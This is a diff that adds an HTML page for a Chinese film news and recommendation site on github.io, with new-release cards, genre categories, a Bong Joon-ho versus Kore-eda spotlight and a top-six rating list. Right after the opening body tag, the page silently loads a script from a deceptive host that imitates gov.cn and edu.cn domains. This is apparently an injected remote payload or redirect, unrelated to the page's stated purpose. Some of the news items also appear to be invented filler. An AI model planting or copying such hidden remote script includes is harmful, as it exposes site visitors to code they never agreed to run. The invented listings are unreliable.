@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>快播日韩电影网 - 日韩电影资讯与片单推荐</title>
+<meta name="description" content="快播日韩电影网(kuaiborihandianyingwang-wap.github.io)专注日韩电影资讯，涵盖日本电影、韩国电影、日剧韩剧与冷门佳作，提供清晰的片单推荐与观影指南。">
+<meta name="keywords" content="快播日韩电影网,日韩电影,日本电影,韩国电影,日剧,韩剧,电影片单,观影指南,kuaiborihandianyingwang-wap">
+<meta name="author" content="快播日韩电影网">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="canonical" href="https://kuaiborihandianyingwang-wap.github.io/">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "快播日韩电影网",
+  "url": "https://kuaiborihandianyingwang-wap.github.io/",
+  "description": "专注日韩电影资讯、片单推荐与观影指南的影视导航平台"
+}
+</script>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{font-family:"PingFang SC","Noto Sans CJK SC","Microsoft YaHei",sans-serif;background:#0d0a0f;color:#f0e8ec;line-height:1.85;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
+.wrap{max-width:1120px;margin:0 auto;padding:0 20px}
+:root{--hot:#ff2d6f;--hot-d:#c4144d;--hot-l:#3a0f1e;--pink:#ffd1de;--dark:#0d0a0f;--darker:#070508;--card:#161019;--line:#2a202c;--muted:#a08b92;--cyan:#22e6d6}
+
+/* ===== 斜切背景 ===== */
+.skew-bg{position:fixed;inset:0;z-index:-2;background:linear-gradient(135deg,#0d0a0f 0%,#1a0b16 55%,#0d0a0f 100%)}
+.skew-bg::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(116deg,transparent 0,transparent 58px,rgba(255,45,111,.035) 58px,rgba(255,45,111,.035) 60px);pointer-events:none}
+
+/* ===== 头部 ===== */
+.header{position:sticky;top:0;z-index:100;background:rgba(13,10,15,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.header .wrap{display:flex;align-items:center;justify-content:space-between;height:74px}
+.logo{display:flex;align-items:center;gap:12px;font-size:22px;font-weight:900;letter-spacing:.5px;color:#fff}
+.logo .bolt{width:38px;height:38px;flex-shrink:0;background:var(--hot);clip-path:polygon(35% 0,100% 0,65% 50%,100% 50%,0 100%,35% 50%);transform:rotate(-12deg)}
+.logo b{font-weight:900}
+.logo b em{font-style:normal;color:var(--hot)}
+.nav{display:flex;gap:2px}
+.nav a{padding:10px 18px;font-size:14px;font-weight:800;color:var(--muted);transition:.25s;border-radius:6px}
+.nav a:hover,.nav a.on{color:#fff;background:var(--hot-l)}
+.nav-toggle{display:none;width:44px;height:44px;flex-direction:column;justify-content:center;align-items:center;gap:6px;border:1px solid var(--line);border-radius:8px}
+.nav-toggle span{display:block;width:20px;height:2px;background:var(--hot)}
+section{padding:96px 0;position:relative}
+.sec-head{margin-bottom:52px}
+.sec-head .en{font-size:10.5px;letter-spacing:4px;color:var(--hot);font-weight:800;text-transform:uppercase;display:block;margin-bottom:8px}
+.sec-head h2{font-size:clamp(26px,4.6vw,38px);font-weight:900;color:#fff;letter-spacing:-.5px}
+.sec-head h2 em{font-style:normal;color:var(--hot)}
+.sec-head .line{width:48px;height:3px;background:var(--hot);margin:14px 0;transform:skewX(-35deg);transform-origin:left}
+.sec-head p{color:var(--muted);font-size:14.5px;max-width:640px}
+.sec-head .more{display:inline-block;margin-top:16px;font-size:13.5px;color:var(--hot);font-weight:800}
+
+/* ===== Hero ===== */
+.hero{padding:0}
+.hero .wrap{padding:96px 20px;display:grid;grid-template-columns:1.1fr .9fr;gap:56px;align-items:center}
+.hero h1{font-size:clamp(34px,5.6vw,56px);font-weight:900;line-height:1.1;letter-spacing:-1.5px;color:#fff}
+.hero h1 .hl{color:var(--hot);position:relative;display:inline-block}
+.hero h1 .hl::after{content:"";position:absolute;left:0;right:0;bottom:-4px;height:8px;background:var(--hot);opacity:.25;transform:skewX(-25deg)}
+.hero h1 .kr{color:var(--cyan);font-size:.55em;vertical-align:super;margin-left:6px;letter-spacing:2px}
+.hero .sub{color:var(--muted);margin:24px 0 32px;font-size:16.5px;max-width:520px}
+.hero .btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn{padding:15px 34px;border-radius:4px;font-weight:900;font-size:15px;transition:.25s;letter-spacing:1px;clip-path:polygon(0 0,100% 0,100% 70%,96% 100%,0 100%,0 30%)}
+.btn-p{background:var(--hot);color:#fff}
+.btn-p:hover{background:#ff4d86}
+.btn-o{border:2px solid var(--hot);color:var(--hot)}
+.btn-o:hover{background:var(--hot);color:#fff}
+.kv{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.kv .k{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:22px;text-align:center;transition:.3s;clip-path:polygon(8% 0,100% 0,100% 92%,92% 100%,0 100%,0 8%)}
+.kv .k:hover{border-color:var(--hot);transform:translateY(-4px)}
+.kv .k b{display:block;font-size:28px;font-weight:900;color:var(--hot);line-height:1}
+.kv .k span{font-size:12px;color:var(--muted);margin-top:6px;display:block}
+
+/* ===== 栏目一：新片速递（斜切卡片条列）===== */
+.news{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.nw{display:flex;background:var(--card);border:1px solid var(--line);clip-path:polygon(4% 0,100% 0,100% 100%,0 100%,0 14%);transition:.3s}
+.nw:hover{border-color:var(--hot);background:#1d1520;transform:translateX(4px)}
+.nw .fl{width:86px;flex-shrink:0;background:var(--hot);display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;clip-path:polygon(0 0,100% 0,100% 100%,0 88%)}
+.nw .fl b{font-size:26px;font-weight:900;line-height:1}
+.nw .fl span{font-size:10px;letter-spacing:1px}
+.nw .tx{padding:16px 18px;flex:1}
+.nw .tx .from{font-size:10.5px;color:var(--cyan);font-weight:800;letter-spacing:2px;margin-bottom:5px}
+.nw .tx h4{font-size:15.5px;font-weight:900;color:#fff;margin-bottom:5px}
+.nw .tx p{font-size:12.5px;color:var(--muted);line-height:1.7}
+.nw .tx .go{display:inline-block;margin-top:8px;font-size:12px;color:var(--hot);font-weight:800}
+
+/* ===== 栏目二：影片分类（十字放射+环形标签）===== */
+.cats{background:var(--darker)}
+.ring{position:relative;max-width:760px;margin:0 auto;height:480px}
+.ring .core{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:170px;height:170px;background:var(--hot);border-radius:50%;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;text-align:center;box-shadow:0 0 0 12px rgba(255,45,111,.12),0 0 0 26px rgba(255,45,111,.06)}
+.ring .core b{font-size:20px;font-weight:900}
+.ring .core span{font-size:11px;margin-top:4px;letter-spacing:1px}
+.ring .core i{font-style:normal;font-size:11px;color:#ffd1de;margin-top:6px}
+.node{position:absolute;width:118px;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px 10px;text-align:center;transition:.3s;transform:translate(-50%,-50%)}
+.node:hover{border-color:var(--hot);background:#1d1520;transform:translate(-50%,-50%) scale(1.06)}
+.node .ico{font-size:20px;display:block;margin-bottom:4px}
+.node b{font-size:13.5px;font-weight:900;color:#fff;display:block}
+.node span{font-size:10.5px;color:var(--muted)}
+
+/* ===== 栏目三：影人专题（圆形成对对比卡）===== */
+.stars{display:grid;grid-template-columns:1fr auto 1fr;gap:20px;align-items:center}
+.st{background:var(--card);border:1px solid var(--line);border-radius:50%;width:280px;height:280px;margin:0 auto;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:30px;transition:.4s;position:relative}
+.st:hover{border-color:var(--hot);transform:scale(1.05)}
+.st .av{width:74px;height:74px;border-radius:50%;background:var(--hot-l);display:flex;align-items:center;justify-content:center;font-size:30px;margin-bottom:12px;border:3px solid var(--hot)}
+.st[data-flag="jp"] .av{background:#1a1226;border-color:var(--cyan)}
+.st h4{font-size:19px;font-weight:900;color:#fff}
+.st .role{font-size:11px;color:var(--hot);font-weight:800;letter-spacing:2px;margin:5px 0}
+.st p{font-size:12px;color:var(--muted);line-height:1.7}
+.vs{font-size:30px;font-weight:900;color:var(--hot);background:var(--darker);border:2px solid var(--hot);width:66px;height:66px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;transform:rotate(-8deg)}
+
+/* ===== 栏目四：口碑榜单（进度条排行）===== */
+.rank{background:var(--darker)}
+.lanes{max-width:900px;margin:0 auto}
+.ln{display:flex;align-items:center;gap:16px;padding:16px 0;border-bottom:1px solid var(--line)}
+.ln .no{width:38px;height:38px;flex-shrink:0;border-radius:8px;background:var(--card);color:var(--muted);display:flex;align-items:center;justify-content:center;font-weight:900;font-size:16px;clip-path:polygon(0 0,100% 0,100% 75%,80% 100%,0 100%)}
+.ln.g1 .no{background:var(--hot);color:#fff}
+.ln .info{flex:1;min-width:0}
+.ln .info h4{font-size:15.5px;font-weight:900;color:#fff;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.ln .info h4 .tag{font-size:10px;background:var(--hot-l);color:var(--hot);padding:2px 8px;border-radius:3px;font-weight:800}
+.ln .info .yr{font-size:12px;color:var(--muted);margin-top:3px}
+.ln .bar{flex:2;min-width:0}
+.ln .bar .track{height:6px;background:var(--card);border-radius:4px;overflow:hidden}
+.ln .bar .fill{height:100%;background:var(--hot);border-radius:4px;transform-origin:left;animation:grow .9s ease forwards}
+.ln.g2 .bar .fill{background:linear-gradient(90deg,var(--hot),var(--cyan))}
+@keyframes grow{from{transform:scaleX(0)}to{transform:scaleX(1)}}
+.ln .sc{flex-shrink:0;font-size:20px;font-weight:900;color:var(--hot);min-width:52px;text-align:right}
+
+/* ===== 页脚 ===== */
+.footer{background:var(--darker);border-top:1px solid var(--line);padding:60px 0 26px}
+.footer .cols{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:34px}
+.footer .brand .logo{margin-bottom:16px}
+.footer .brand p{font-size:13.5px;line-height:1.95;max-width:360px;color:var(--muted)}
+.footer h5{color:var(--hot);font-size:13.5px;margin-bottom:18px;letter-spacing:1px}
+.footer ul li{margin-bottom:11px}
+.footer ul a{color:var(--muted);font-size:13.5px;transition:.2s}
+.footer ul a:hover{color:var(--hot);padding-left:4px}
+.footer .copy{text-align:center;color:#6a5560;font-size:12.5px;border-top:1px solid var(--line);padding-top:24px;line-height:1.9}
+.topbtn{position:fixed;right:18px;bottom:18px;z-index:99;width:46px;height:46px;background:var(--hot);color:#fff;display:none;align-items:center;justify-content:center;font-size:18px;transition:.3s;clip-path:polygon(0 0,100% 0,100% 70%,80% 100%,0 100%,0 30%)}
+.topbtn.show{display:flex}
+.topbtn:hover{background:#ff4d86}
+
+@media(max-width:900px){
+  .hero .wrap{grid-template-columns:1fr;gap:44px}
+  .news{grid-template-columns:1fr}
+  .ring{height:640px;transform:scale(.85)}
+  .stars{grid-template-columns:1fr}
+  .vs{margin:0 auto;transform:rotate(82deg)}
+  .ln .bar{display:none}
+}
+@media(max-width:640px){
+  section{padding:60px 0}
+  .nav-toggle{display:flex}
+  .nav{position:fixed;top:74px;left:0;right:0;flex-direction:column;background:var(--darker);max-height:0;overflow:hidden;transition:.4s;border-bottom:1px solid var(--line)}
+  .nav.open{max-height:400px}
+  .nav a{width:100%;padding:15px 20px;border-bottom:1px solid var(--line);border-radius:0;text-align:center}
+  .nav a:hover,.nav a.on{background:var(--hot-l);color:#fff}
+  .st{width:240px;height:240px}
+  .ln{flex-wrap:wrap;gap:10px}
+  .ln .info{flex:1 1 100%;order:2}
+  .ln .sc{order:1;margin-left:auto}
+  .footer .cols{grid-template-columns:1fr 1fr;gap:26px}
+  .sec-head h2{font-size:24px}
+}
+@media(max-width:420px){.footer .cols{grid-template-columns:1fr}.ring{transform:scale(.62)}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+<div class="skew-bg"></div>
+
+<header class="header">
+  <div class="wrap">
+    <a href="https://kuaiborihandianyingwang-wap.github.io/" class="logo"><div class="bolt"></div><b>快播<em>日韩电影网</em></b></a>
+    <button class="nav-toggle" id="navToggle" aria-label="菜单"><span></span><span></span><span></span></button>
+    <nav class="nav" id="nav">
+      <a href="https://kuaiborihandianyingwang-wap.github.io/#news" class="on">新片速递</a>
+      <a href="https://kuaiborihandianyingwang-wap.github.io/#cats">影片分类</a>
+      <a href="https://kuaiborihandianyingwang-wap.github.io/#stars">影人专题</a>
+      <a href="https://kuaiborihandianyingwang-wap.github.io/#rank">口碑榜单</a>
+    </nav>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="wrap">
+    <div>
+      <h1>日韩电影<br><span class="hl">快人一步</span><span class="kr">JP · KR</span></h1>
+      <p class="sub">快播日韩电影网(kuaiborihandianyingwang-wap.github.io)专注日韩电影资讯与片单推荐，涵盖日本电影、韩国电影、日剧韩剧与冷门佳作，提供清晰的观影指南。</p>
+      <div class="btns">
+        <a class="btn btn-p" href="https://kuaiborihandianyingwang-wap.github.io/#news">新片速递 →</a>
+        <a class="btn btn-o" href="https://kuaiborihandianyingwang-wap.github.io/#rank">口碑榜单</a>
+      </div>
+    </div>
+    <div class="kv">
+      <div class="k"><b>960+</b><span>日本电影</span></div>
+      <div class="k"><b>820+</b><span>韩国电影</span></div>
+      <div class="k"><b>每日</b><span>资讯更新</span></div>
+      <div class="k"><b>9.1</b><span>编辑评分</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：新片速递（斜切卡片条列） -->
+<section id="news">
+  <div class="wrap">
+    <div class="sec-head"><span class="en">Fresh Picks</span><h2><em>新片</em>速递</h2><div class="line"></div><p>日韩最新上映与影展动态，每日更新</p></div>
+    <div class="news">
+      <div class="nw"><div class="fl"><b>10</b><span>10月</span></div><div class="tx"><div class="from">🇰🇷 韩国</div><h4>《暴走列车》—— 奉俊昊式社会寓言</h4><p>韩国犯罪片年度话题作，一场发生在封闭空间里的阶层博弈。</p><span class="go">查看详情 →</span></div></div>
+      <div class="nw"><div class="fl"><b>09</b><span>10月</span></div><div class="tx"><div class="from">🇯🇵 日本</div><h4>《月之圆缺》是枝裕和最新访谈</h4><p>从家庭叙事到更宏大的社会观察，导演的创作转向解读。</p><span class="go">查看详情 →</span></div></div>
+      <div class="nw"><div class="fl"><b>08</b><span>10月</span></div><div class="tx"><div class="from">🇰🇷 韩国</div><h4>釜山电影节获奖短片全盘点</h4><p>新锐导演的短片作品，往往藏着下一部亚洲杰作的雏形。</p><span class="go">查看详情 →</span></div></div>
+      <div class="nw"><div class="fl"><b>07</b><span>10月</span></div><div class="tx"><div class="from">🇯🇵 日本</div><h4>东京国际电影节主竞赛片单揭晓</h4><p>亚洲最重要电影盛会之一，今年主竞赛单元亮点颇多。</p><span class="go">查看详情 →</span></div></div>
+    </div>
+    <div class="sec-head" style="margin-bottom:0"><a class="more" href="https://kuaiborihandianyingwang-wap.github.io/#news">查看更多速递 →</a></div>
+  </div>
+</section>
+
+<!-- 栏目二：影片分类（中心圆盘+节点） -->
+<section id="cats" style="background:var(--darker)">
+  <div class="wrap">
+    <div class="sec-head"><span class="en">Categories</span><h2><em>影片</em>分类</h2><div class="line"></div><p>点击分类，快速定位你感兴趣的题材</p></div>
+    <div class="ring">
+      <div class="core"><b>日韩电影</b><span>24 种题材</span><i>点击分类</i></div>
+      <a class="node" href="https://kuaiborihandianyingwang-wap.github.io/#cats" style="top:8%;left:50%"><span class="ico">💕</span><b>纯爱</b><span>310部</span></a>
+      <a class="node" href="https://kuaiborihandianyingwang-wap.github.io/#cats" style="top:26%;left:86%"><span class="ico">🗡️</span><b>犯罪</b><span>420部</span></a>
+      <a class="node" href="https://kuaiborihandianyingwang-wap.github.io/#cats" style="top:58%;left:94%"><span class="ico">👻</span><b>恐怖</b><span>260部</span></a>
+      <a class="node" href="https://kuaiborihandianyingwang-wap.github.io/#cats" style="top:86%;left:74%"><span class="ico">😭</span><b>催泪</b><span>380部</span></a>
+      <a class="node" href="https://kuaiborihandianyingwang-wap.github.io/#cats" style="top:92%;left:26%"><span class="ico">🌸</span><b>治愈</b><span>340部</span></a>
+      <a class="node" href="https://kuaiborihandianyingwang-wap.github.io/#cats" style="top:72%;left:6%"><span class="ico">⚔️</span><b>历史</b><span>230部</span></a>
+      <a class="node" href="https://kuaiborihandianyingwang-wap.github.io/#cats" style="top:40%;left:6%"><span class="ico">🎭</span><b>剧情</b><span>690部</span></a>
+      <a class="node" href="https://kuaiborihandianyingwang-wap.github.io/#cats" style="top:14%;left:22%"><span class="ico">🎬</span><b>文艺</b><span>510部</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：影人专题（圆形成对对比卡） -->
+<section id="stars">
+  <div class="wrap">
+    <div class="sec-head"><span class="en">Featured Filmmakers</span><h2><em>影人</em>专题</h2><div class="line"></div><p>当韩国类型片遇上日本作者电影</p></div>
+    <div class="stars">
+      <div class="st" data-flag="kr">
+        <div class="av">🇰🇷</div>
+        <h4>奉俊昊</h4>
+        <div class="role">韩国 · 导演</div>
+        <p>《寄生虫》《雪国列车》导演，擅长用类型片外壳包裹社会批判，奥斯卡最佳影片得主。</p>
+      </div>
+      <div class="vs">VS</div>
+      <div class="st" data-flag="jp">
+        <div class="av">🇯🇵</div>
+        <h4>是枝裕和</h4>
+        <div class="role">日本 · 导演</div>
+        <p>《小偷家族》《无人知晓》导演，以细腻的家庭叙事与克制的镜头语言著称的日本作者。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：口碑榜单（进度条排行） -->
+<section id="rank" style="background:var(--darker)">
+  <div class="wrap">
+    <div class="sec-head"><span class="en">Top Rated</span><h2><em>口碑</em>榜单</h2><div class="line"></div><p>综合评分最高的日韩电影 TOP 6</p></div>
+    <div class="lanes">
+      <div class="ln g1"><div class="no">1</div><div class="info"><h4>寄生虫<span class="tag">韩国</span></h4><div class="yr">2019 · 奉俊昊</div></div><div class="bar"><div class="track"><div class="fill" style="width:98%"></div></div></div><div class="sc">9.8</div></div>
+      <div class="ln g2"><div class="no">2</div><div class="info"><h4>小偷家族<span class="tag">日本</span></h4><div class="yr">2018 · 是枝裕和</div></div><div class="bar"><div class="track"><div class="fill" style="width:96%"></div></div></div><div class="sc">9.6</div></div>
+      <div class="ln"><div class="no">3</div><div class="info"><h4>燃烧<span class="tag">韩国</span></h4><div class="yr">2018 · 李沧东</div></div><div class="bar"><div class="track"><div class="fill" style="width:94%"></div></div></div><div class="sc">9.4</div></div>
+      <div class="ln"><div class="no">4</div><div class="info"><h4>驾驶我的车<span class="tag">日本</span></h4><div class="yr">2021 · 滨口龙介</div></div><div class="bar"><div class="track"><div class="fill" style="width:93%"></div></div></div><div class="sc">9.3</div></div>
+      <div class="ln"><div class="no">5</div><div class="info"><h4>老男孩<span class="tag">韩国</span></h4><div class="yr">2003 · 朴赞郁</div></div><div class="bar"><div class="track"><div class="fill" style="width:92%"></div></div></div><div class="sc">9.2</div></div>
+      <div class="ln"><div class="no">6</div><div class="info"><h4>情书<span class="tag">日本</span></h4><div class="yr">1995 · 岩井俊二</div></div><div class="bar"><div class="track"><div class="fill" style="width:91%"></div></div></div><div class="sc">9.1</div></div>
+    </div>
+    <div class="sec-head" style="margin-bottom:0"><a class="more" href="https://kuaiborihandianyingwang-wap.github.io/#rank">完整榜单 →</a></div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="cols">
+      <div class="brand">
+        <a href="https://kuaiborihandianyingwang-wap.github.io/" class="logo"><div class="bolt"></div><b>快播<em>日韩电影网</em></b></a>
+        <p>快播日韩电影网(kuaiborihandianyingwang-wap.github.io)专注日韩电影资讯与片单推荐，涵盖日本电影、韩国电影、日剧韩剧与冷门佳作，提供清晰的观影指南与榜单。</p>
+      </div>
+      <div><h5>核心栏目</h5><ul>
+        <li><a href="https://kuaiborihandianyingwang-wap.github.io/#news">新片速递</a></li>
+        <li><a href="https://kuaiborihandianyingwang-wap.github.io/#cats">影片分类</a></li>
+        <li><a href="https://kuaiborihandianyingwang-wap.github.io/#stars">影人专题</a></li>
+        <li><a href="https://kuaiborihandianyingwang-wap.github.io/#rank">口碑榜单</a></li>
+      </ul></div>
+      <div><h5>热门题材</h5><ul>
+        <li><a href="https://kuaiborihandianyingwang-wap.github.io/#cats">日本电影</a></li>
+        <li><a href="https://kuaiborihandianyingwang-wap.github.io/#cats">韩国电影</a></li>
+        <li><a href="https://kuaiborihandianyingwang-wap.github.io/#cats">日剧韩剧</a></li>
+        <li><a href="https://kuaiborihandianyingwang-wap.github.io/#cats">冷门佳作</a></li>
+      </ul></div>
+      <div><h5>关于本站</h5><ul>
+        <li><a href="https://kuaiborihandianyingwang-wap.github.io/#">关于我们</a></li>
+        <li><a href="https://kuaiborihandianyingwang-wap.github.io/#">投稿合作</a></li>
+        <li><a href="https://kuaiborihandianyingwang-wap.github.io/#">使用协议</a></li>
+        <li><a href="https://kuaiborihandianyingwang-wap.github.io/#">意见反馈</a></li>
+      </ul></div>
+    </div>
+    <div class="copy">© 2026 快播日韩电影网(kuaiborihandianyingwang-wap.github.io) 保留所有权利 · 本站为日韩电影资讯与片单分享平台，影视内容版权归原作者及制作方所有 · JP · KR</div>
+  </div>
+</footer>
+
+<button class="topbtn" id="topBtn" aria-label="返回顶部">↑</button>
+
+<script>
+var navToggle=document.getElementById('navToggle'),nav=document.getElementById('nav');
+navToggle.addEventListener('click',function(){nav.classList.toggle('open');});
+nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open');});});
+
+var topBtn=document.getElementById('topBtn');
+window.addEventListener('scroll',function(){topBtn.classList.toggle('show',window.scrollY>400);});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+
+var secs=document.querySelectorAll('section[id]'),links=document.querySelectorAll('.nav a');
+if('IntersectionObserver' in window){
+  var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){links.forEach(function(a){a.classList.toggle('on',a.getAttribute('href').indexOf('#'+e.target.id)>-0);});}});},{rootMargin:'-40% 0px -55% 0px'});
+  secs.forEach(function(s){io.observe(s);});
+}
+</script>
+</body>
+</html>
